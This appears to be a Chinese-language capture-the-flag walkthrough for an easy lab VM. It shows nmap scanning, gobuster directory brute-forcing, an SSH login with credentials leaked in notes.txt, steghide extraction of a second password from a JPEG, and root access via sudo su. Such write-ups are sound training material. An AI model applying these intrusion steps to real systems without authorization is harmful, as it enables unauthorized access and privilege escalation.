> ubuntu 17.10之后网卡配置文件在/etc/netplan/xx-netcfg.yaml , lsb_release -a 查看发行版
## 靶机信息
- 级别:容易



## Recon
### nmap

```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.152

sudo nmap -sT -p- --min-rate 10000 192.168.1.152 -oA tcp_scan/ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Web
### 目录爆破
```shell
gobuster dir -u http://192.168.1.152 -w /usr/share/wordlists/dirb/common.txt -x txt,php
/notes.txt            (Status: 200) [Size: 86]
```
![[Pasted image 20231013151938.png]]
```shell
//敏感信息泄露 
first_stage:flagitifyoucan1234
//这可能是一个ssh凭证
ssh first_stage@192.168.1.152
passwd:flagitifyoucan1234
```
user flag:
![[Pasted image 20231013152933.png]]

### 图片隐写
```shell
sudo scp first_stage@192.168.1.152:/home/mhz_c1f/Paintings/'spinning the wool.jpeg' ./Pantings //不知道为啥*不被识别成通配符而是文件名
file *.jpeg
//是否有捆绑
binwalk *.jpeg
```

### steghide
```shell
sudo apt install -y steghide
steghide info spinning\ the\ wool.jpeg 
Enter passphrase //直接回车
Enter passphrase: 
  embedded file "remb2.txt":
    size: 85.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
看到有 remb2.txt文件
//提取这个文件
sudo steghide extract -sf spinning\ the\ wool.jpeg //提取remb2.txt需要在本机写入，需要sudo权限
//cat remb2.txt得到凭证

mhz_c1f:1@ec1f
```


## 提权
```
su mhz_c1f
sudo -l //三个ALL
直接sudo su提权即可
```
![[Pasted image 20231013160610.png]]
